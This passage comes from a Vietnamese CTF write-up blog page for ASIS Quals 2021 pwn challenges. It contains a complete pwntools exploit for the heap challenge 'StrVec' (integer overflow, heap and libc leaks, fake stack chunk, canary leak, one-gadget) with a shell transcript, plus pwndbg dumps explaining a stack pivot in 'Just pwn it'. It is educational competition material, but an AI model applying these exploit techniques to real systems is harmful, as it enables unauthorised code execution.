idx = readint(\"idx = \"); char *data = (char*)vector_get(vec, idx); printf(\"vec.get(idx) -\u003e %s\\n\", data ? data : \"[undefined]\"); break; } case 2: { int idx = readint(\"idx = \"); char *data = (char*)malloc(0x20); if (!data) break; readline(\"data = \", data, 0x20); int result = vector_set(vec, idx, (void*)data); printf(\"vec.set(idx, data) -\u003e %d\\n\", result); if (result == -1) free(data); break; } default: vector_delete(vec); printf(\"Bye, %s!\\n\", name); return 0; } } } __attribute__((constructor)) void setup(void) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(180); } Nhìn sơ qua thì có vẻ là 1 bài heap.\nSolution: Bug nằm ở đoạn code dưới đây:\nvector *vector_new(int nmemb) { if (nmemb \u003c= 0) return NULL; int size = sizeof(vector) + sizeof(void*) * nmemb; vector *vec = (vector*)malloc(size); if (!vec) return NULL; memset(vec, 0, size); vec-\u003esize = nmemb; return vec; } Nếu nmemb == 2147483647 thì size sẽ là 0 (integer overflow), và vec-\u003esize không được update bằng size mà lại là nmemb nên mình có thể thực hiện out-of-bounds read and write. Mình sẽ dùng lỗi oob để leak heap với libc trước:\nname = b'a' p.recv() p.sendline(name) p.recv() p.sendline(b'2147483647') set(0, b'a'*8) set(4) get(0) p.recvuntil(b'a'*8) heap_leak = u64(p.recvline().strip().ljust(8, b'\\x00')) log.info('heap_leak: ' + hex(heap_leak)) heap_base = heap_leak - 0x2f0 log.info('heap_base: ' + hex(heap_base)) set(1) count = 8 # Prepare to free a chunk into unsorted bin for i in range(5, 35): if(i == count): count += 6 continue set(i) set(0) set(3, p64(heap_base + 0x2d0) + p64(0x531)) set(0, p64(heap_base + 0x300)) get(5) p.recvuntil(b'vec.get(idx) -\u003e ') libc_leak = u64(p.recvline().strip().ljust(8, b'\\x00')) log.info('libc_leak: ' + hex(libc_leak)) libc.address = libc_leak - 0x1ebbe0 log.info('libc_base: ' + hex(libc.address)) Sau khi đã có heap với libc address thì mình đã stuck khá lâu do mình chỉ có thể ‘mess’ được với 1 chunk, mà size thì lại cố định là 0x20 nữa nên hầu hết các kỹ thuật đều rất khó thực hiện. Một lúc sau thì mình mới tự hỏi: ‘Ủa nãy giờ biến name khum thấy m xài zậy!??’.\nVà thế là 1 idea mới xuất hiện. Mình sẽ tạo 1 fake chunk trên stack bằng cách set biến name thành metadata với size của 1 chunk rồi sẽ free nó, lần malloc tiếp theo sẽ trả về fake chunk đó. Cuối cùng thì mình ghi đè return address thành one gadget.\nFinal script from pwn import * # p = process('./strvec') libc = ELF('./libc-2.31.so') p = remote('168.119.108.148', 12010) def set(idx, data = b'\\x00'): p.sendlineafter(b'\u003e ', b'2') p.sendlineafter(b'= ', str(idx).encode('utf-8')) p.sendlineafter(b'= ', bytes(data)) def get(idx): p.sendlineafter(b'\u003e ', b'1') p.sendlineafter(b'= ', str(idx).encode('utf-8')) # Create a fake chunk name = p64(0) + b'\\x31' + b'\\x00'*5 p.recv() p.sendline(name) p.recv() p.sendline(b'2147483647') set(0, b'a'*8) set(4) get(0) p.recvuntil(b'a'*8) heap_leak = u64(p.recvline().strip().ljust(8, b'\\x00')) log.info('heap_leak: ' + hex(heap_leak)) heap_base = heap_leak - 0x2f0 log.info('heap_base: ' + hex(heap_base)) set(1) count = 8 # Prepare to free a chunk into unsorted bin for i in range(5, 35): if(i == count): count += 6 continue set(i) set(0) set(3, p64(heap_base + 0x2d0) + p64(0x531)) set(0, p64(heap_base + 0x300)) get(5) p.recvuntil(b'vec.get(idx) -\u003e ') libc_leak = u64(p.recvline().strip().ljust(8, b'\\x00')) log.info('libc_leak: ' + hex(libc_leak)) libc.address = libc_leak - 0x1ebbe0 log.info('libc_base: ' + hex(libc.address)) # Environ variable stores a stack address environ = libc.sym['environ'] log.info('environ: ' + hex(environ)) one_gadget = libc.address + 0xe6c81 log.info('one_gadget: ' + hex(one_gadget)) set(35) set(0, p64(environ)) set(3, p64(0) + p64(0x31)) get(11) p.recvuntil(b'vec.get(idx) -\u003e ') stack_leak = u64(p.recvline().strip().ljust(8, b'\\x00')) log.info('stack_leak: ' + hex(stack_leak)) fake_chunk = stack_leak - 0x118 set(0, p64(stack_leak - 0x10f) + p64(fake_chunk) + p64(heap_base + 0x2a0)) get(3) p.recvuntil(b'vec.get(idx) -\u003e ') canary = u64(b'\\x00' + p.recvline().strip()) log.info('canary: ' + hex(canary)) set(4) set(36, p64(0) + p64(canary) + p64(0) + p64(one_gadget)[:6]) # Reset the size by freeing vec set(5) # Change bk pointer to double free set(0) # Get shell! p.recv() p.sendline(b'3') p.interactive() [+] Opening connection to 168.119.108.148 on port 12010: Done [*] heap_leak: 0x5606633792f0 [*] heap_base: 0x560663379000 [*] libc_leak: 0x7f186db1cbe0 [*] libc_base: 0x7f186d931000 [*] environ: 0x7f186db202e0 [*] one_gadget: 0x7f186da17c81 [*] stack_leak: 0x7ffea895dda8 [*] canary: 0x3936128e303f100 [*] Switching to interactive mode Bye, ! $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-970df57dcd98b545bb0b620bc4b6cab0.txt $ cat flag-970df57dcd98b545bb0b620bc4b6cab0.txt ASIS{n0_1d34_4_g00d_fl4g_t3xt_59723644e687a5c5e2fe80eae0b4f4b8} ",
+  "wordCount" : "3237",
+  "inLanguage": "en",
+  "datePublished": "2021-10-25T18:19:29+07:00",
+  "dateModified": "2021-10-25T18:19:29+07:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://pivik271.github.io/posts/asisquals2021/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "pivik",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://pivik271.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://pivik271.github.io/" accesskey="h" title="pivik (Alt + H)">pivik</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://pivik271.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pivik271.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      ASIS QUALS - Just pwn it, ABBR, StrVec
+    </h1>
+    <div class="post-meta"><span title='2021-10-25 18:19:29 +0700 +07'>October 25, 2021</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰</p>
+<p><img loading="lazy" src="/posts/asisquals2021/img1.png" alt="img"  />
+</p>
+<p>Mình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay.<br>
+Các binary với solve script mình sẽ để ở <a href="https://github.com/pivik271/ctf-writeups/tree/main/2021/Asis%20Quals">đây</a>.</p>
+<h1 id="just-pwn-it">Just pwn it:<a hidden class="anchor" aria-hidden="true" href="#just-pwn-it">#</a></h1>
+<ul>
+<li>Category: pwn</li>
+<li>Points: 51</li>
+<li>Solves: 106</li>
+<li>Description: Just Pwn It! Nothing else!!</li>
+</ul>
+<h2 id="source-code-overview">Source code overview<a hidden class="anchor" aria-hidden="true" href="#source-code-overview">#</a></h2>
+<p>Tác giả cho luôn source, vậy cùng xem qua nào!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STR_SIZE 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_element</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>parray) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> index;
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>index) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>)		<span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(parray[index] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)calloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>), STR_SIZE)))
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Data: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fgets(parray[index], STR_SIZE, stdin))
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">justpwnit</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>array[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    set_element(array);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">180</span>);
+</span></span><span style="display:flex;"><span>  justpwnit();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Không có gì nhiều, khá ngắn gọn.</p>
+<h2 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
+<p>Sau khi nhập index ở <code>[1]</code> xong thì chương trình không check boundary nên sẽ dẫn đến lỗi <code>out-of-bounds</code>. Phần buffer mình nhập không nằm trên stack mà nằm trên vùng memory được trả về bởi <code>calloc()</code>. Vậy để điều khiển được flow của chương trình thì mình sẽ dùng kỹ thuật <code>stack pivot</code>. Xem qua stack khi vào hàm <code>set_element()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*RBP  0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1
+</span></span><span style="display:flex;"><span>*RSP  0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>*RIP  0x401193 <span style="color:#f92672">(</span>set_element+90<span style="color:#f92672">)</span> ◂— lea    rbx, <span style="color:#f92672">[</span>rdx + rax<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   0x401176 &lt;set_element+61&gt;     je     set_element+73                      &lt;set_element+73&gt;
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>   0x401182 &lt;set_element+73&gt;     mov    eax, dword ptr <span style="color:#f92672">[</span>rbp - 0x14<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x401185 &lt;set_element+76&gt;     cdqe   
+</span></span><span style="display:flex;"><span>   0x401187 &lt;set_element+78&gt;     lea    rdx, <span style="color:#f92672">[</span>rax*8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x40118f &lt;set_element+86&gt;     mov    rax, qword ptr <span style="color:#f92672">[</span>rbp - 0x28<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ► 0x401193 &lt;set_element+90&gt;     lea    rbx, <span style="color:#f92672">[</span>rdx + rax<span style="color:#f92672">]</span>              &lt;0x40123d&gt;
+</span></span><span style="display:flex;"><span>   0x401197 &lt;set_element+94&gt;     mov    esi, 0x80
+</span></span><span style="display:flex;"><span>   0x40119c &lt;set_element+99&gt;     mov    edi, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>   0x4011a1 &lt;set_element+104&gt;    call   calloc                      &lt;calloc&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   0x4011a6 &lt;set_element+109&gt;    mov    qword ptr <span style="color:#f92672">[</span>rbx<span style="color:#f92672">]</span>, rax
+</span></span><span style="display:flex;"><span>   0x4011a9 &lt;set_element+112&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rbx<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>00:0000│ rsp 0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>01:0008│     0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>02:0010│     0x7fffffffdea0 ◂— 0x0
+</span></span><span style="display:flex;"><span>03:0018│     0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* <span style="color:#e6db74">&#39;?=@&#39;</span> */
+</span></span><span style="display:flex;"><span>04:0020│     0x7fffffffdeb0 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0028│     0x7fffffffdeb8 —▸ 0x40123d <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1
+</span></span><span style="display:flex;"><span>07:0038│     0x7fffffffdec8 —▸ 0x40122f <span style="color:#f92672">(</span>justpwnit+33<span style="color:#f92672">)</span> ◂— add    dword ptr <span style="color:#f92672">[</span>rbp - 4<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span>         0x401193 set_element+90
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">1</span>         0x40122f justpwnit+33
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">2</span>         0x401295 main+88
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">3</span>         0x40147c libc_start_main_stage2+43
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">4</span>         0x401451 libc_start_main_stage2
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">5</span>              0x0
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt; telescope <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>00:0000│ rsp 0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>01:0008│     0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>02:0010│     0x7fffffffdea0 ◂— 0x0
+</span></span><span style="display:flex;"><span>03:0018│     0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* <span style="color:#e6db74">&#39;?=@&#39;</span> */
+</span></span><span style="display:flex;"><span>04:0020│     0x7fffffffdeb0 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0028│     0x7fffffffdeb8 —▸ 0x40123d <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1
+</span></span><span style="display:flex;"><span>07:0038│     0x7fffffffdec8 —▸ 0x40122f <span style="color:#f92672">(</span>justpwnit+33<span style="color:#f92672">)</span> ◂— add    dword ptr <span style="color:#f92672">[</span>rbp - 4<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>08:0040│ rax 0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>09:0048│     0x7fffffffded8 ◂— 0x0
+</span></span></code></pre></div><p>Base address của array là <code>0x7fffffffded0</code>, và giá trị của <code>rbp</code> là <code>0x7fffffffdec0</code>. Vậy nếu mình nhập <code>-2</code> vào index thì địa chỉ chứa ở <code>rbp</code> sẽ trỏ tới buffer của mình.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> RBP  0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span> RSP  0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>*RIP  0x4011f7 <span style="color:#f92672">(</span>set_element+190<span style="color:#f92672">)</span> ◂— test   rax, rax
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   0x4011e4 &lt;set_element+171&gt;    add    rax, rcx
+</span></span><span style="display:flex;"><span>   0x4011e7 &lt;set_element+174&gt;    mov    rax, qword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x4011ea &lt;set_element+177&gt;    mov    esi, 0x80
+</span></span><span style="display:flex;"><span>   0x4011ef &lt;set_element+182&gt;    mov    rdi, rax
+</span></span><span style="display:flex;"><span>   0x4011f2 &lt;set_element+185&gt;    call   fgets_unlocked                      &lt;fgets_unlocked&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> ► 0x4011f7 &lt;set_element+190&gt;    test   rax, rax
+</span></span><span style="display:flex;"><span>   0x4011fa &lt;set_element+193&gt;    jne    set_element+205                      &lt;set_element+205&gt;
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>   0x401206 &lt;set_element+205&gt;    nop    
+</span></span><span style="display:flex;"><span>   0x401207 &lt;set_element+206&gt;    add    rsp, 0x28
+</span></span><span style="display:flex;"><span>   0x40120b &lt;set_element+210&gt;    pop    rbx
+</span></span><span style="display:flex;"><span>   0x40120c &lt;set_element+211&gt;    pop    rbp
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>00:0000│ rsp     0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>01:0008│         0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>02:0010│         0x7fffffffdea0 ◂— 0x0
+</span></span><span style="display:flex;"><span>03:0018│         0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* <span style="color:#e6db74">&#39;?=@&#39;</span> */
+</span></span><span style="display:flex;"><span>04:0020│         0x7fffffffdeb0 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0028│         0x7fffffffdeb8 —▸ 0x40123d <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>07:0038│         0x7fffffffdec8 —▸ 0x40122f <span style="color:#f92672">(</span>justpwnit+33<span style="color:#f92672">)</span> ◂— add    dword ptr <span style="color:#f92672">[</span>rbp - 4<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span>         0x4011f7 set_element+190
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt; telescope <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>00:0000│ rsp     0x7fffffffde90 ◂— 0x0
+</span></span><span style="display:flex;"><span>01:0008│         0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>02:0010│         0x7fffffffdea0 ◂— 0x0
+</span></span><span style="display:flex;"><span>03:0018│         0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* <span style="color:#e6db74">&#39;?=@&#39;</span> */
+</span></span><span style="display:flex;"><span>04:0020│         0x7fffffffdeb0 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0028│         0x7fffffffdeb8 —▸ 0x40123d <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64 
+</span></span><span style="display:flex;"><span>06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— <span style="color:#e6db74">&#39;aaaaaaaabbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>07:0038│         0x7fffffffdec8 —▸ 0x40122f <span style="color:#f92672">(</span>justpwnit+33<span style="color:#f92672">)</span> ◂— add    dword ptr <span style="color:#f92672">[</span>rbp - 4<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>08:0040│         0x7fffffffded0 ◂— 0xb4
+</span></span><span style="display:flex;"><span>09:0048│         0x7fffffffded8 ◂— 0x0
+</span></span></code></pre></div><p>Sau khi thực hiện instruction <code>pop rbp</code> ở cuối hàm <code>set_element()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40120c</span> <span style="color:#f92672">&lt;</span>set_element<span style="color:#f92672">+</span><span style="color:#ae81ff">211</span><span style="color:#f92672">&gt;</span>    pop    rbp
+</span></span></code></pre></div><p>và <code>leave ; ret</code> ở cuối hàm <code>justpwnit()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40123b</span> <span style="color:#f92672">&lt;</span>justpwnit<span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>       leave
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40123c</span> <span style="color:#f92672">&lt;</span>justpwnit<span style="color:#f92672">+</span><span style="color:#ae81ff">46</span><span style="color:#f92672">&gt;</span>       ret  
+</span></span></code></pre></div><p>thì mình sẽ pivot được stack lên vùng buffer mà mình control.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*RBP  0x6161616161616161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaaaaaaa&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>*RSP  0x7ffff7ff8058 ◂— <span style="color:#e6db74">&#39;bbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>*RIP  0x40123c <span style="color:#f92672">(</span>justpwnit+46<span style="color:#f92672">)</span> ◂— ret    
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   0x401233 &lt;justpwnit+37&gt;    cmp    dword ptr <span style="color:#f92672">[</span>rbp - 4<span style="color:#f92672">]</span>, <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>   0x401237 &lt;justpwnit+41&gt;    jle    justpwnit+21                      &lt;justpwnit+21&gt;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>   0x401239 &lt;justpwnit+43&gt;    nop    
+</span></span><span style="display:flex;"><span>   0x40123a &lt;justpwnit+44&gt;    nop    
+</span></span><span style="display:flex;"><span>   0x40123b &lt;justpwnit+45&gt;    leave  
+</span></span><span style="display:flex;"><span> ► 0x40123c &lt;justpwnit+46&gt;    ret    &lt;0x6262626262626262&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>00:0000│ rsp   0x7ffff7ff8058 ◂— <span style="color:#e6db74">&#39;bbbbbbbb\n&#39;</span>
+</span></span><span style="display:flex;"><span>01:0008│ rdx-1 0x7ffff7ff8060 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
+</span></span><span style="display:flex;"><span>02:0010│       0x7ffff7ff8068 ◂— 0x0
+</span></span><span style="display:flex;"><span>... ↓          <span style="color:#ae81ff">5</span> skipped
+</span></span><span style="display:flex;"><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
